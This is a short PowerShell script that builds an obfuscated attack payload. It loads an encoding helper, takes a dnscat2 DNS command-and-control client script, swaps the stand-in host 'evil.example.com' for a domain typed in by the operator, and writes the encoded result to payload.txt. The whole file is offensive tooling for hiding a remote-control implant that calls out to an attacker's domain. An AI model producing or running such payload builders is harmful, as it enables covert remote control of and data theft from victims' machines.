#Source the Out-EncodedCommand file.
. .\Out-EncodedCommand.ps1

$Domain = (Read-Host -Prompt "Domain name please?")
$PlaceHolder = "evil.example.com"
$Content = (Get-Content "dnscat2.ps1" | Out-String)
$Content = $Content -replace $PlaceHolder,$Domain
$OutFile = "payload.txt"
Out-EncodedCommand -ScriptBlock ([ScriptBlock]::Create($Content)) | Out-File -FilePath $OutFile
notepad.exe $OutFile
